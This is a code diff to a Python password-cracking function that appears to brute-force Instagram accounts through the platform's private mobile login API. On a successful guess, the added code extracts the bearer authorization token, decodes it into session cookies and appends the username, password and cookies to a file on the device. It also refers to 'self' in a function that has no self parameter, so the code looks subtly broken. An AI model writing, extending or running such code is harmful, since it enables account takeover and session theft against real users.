@@ -205,21 +205,51 @@ def crack(uid, password_list, total_count):
                 "ar_event_source": "login_home_page"
             }
         }
-            
+            # Convert params to JSON string and URL encode
+            import json
+            params_json = json.dumps(params_dict)
+            encoded_params = urllib.parse.quote(params_json)
+        
+            # Prepare the complete encoded string
+            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
+        
+            # Update content-length in headers
+            headers['content-length'] = str(len(encode))
+            # login url 
+            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
             # Make API request
             response = session.post(
-                'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',
-                data=encode,
-                headers=headers,
-                timeout=30,
+                url, 
+                data=encode, 
+                headers=headers, 
                 allow_redirects=True
             )
-            
             # Check response
             if 'logged_in_user' in response.text:
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                save_success(uid, pw)
-                return True
+                try:
+                    # Clean up the response text by removing escaped backslashes
+                    clean_response = str(response.text).replace('\\', '')
+                    # Extract IG-Set-Authorization header
+                    ig_set_auth_match = re.search(r'"IG-Set-Authorization": "(.*?)"', clean_response)
+                    if ig_set_auth_match:
+                        self.ig_set_autorization = ig_set_auth_match.group(1)
+                        # Decode the base64 part after "Bearer IGT:2:"
+                        if "Bearer IGT:2:" in self.ig_set_autorization:
+                            base64_part = self.ig_set_autorization.split('Bearer IGT:2:')[1]
+                            # Add padding if necessary for base64 decoding
+                            padding = 4 - len(base64_part) % 4
+                            if padding != 4:
+                                base64_part += "=" * padding
+                            # Decode base64
+                            decoded_bytes = base64.urlsafe_b64decode(base64_part)
+                            self.decode_ig_set_authorization = json.loads(decoded_bytes.decode('utf-8'))                 
+                            # Create cookie string from decoded data
+                            cookies = ';'.join([f'{name}={value}' for name, value in self.decode_ig_set_authorization.items()])
+                            print(f"\n=== Cookie ===")
+                            print(cookies)
+                            open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
+                            return True
             elif 'challenge_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                 continue
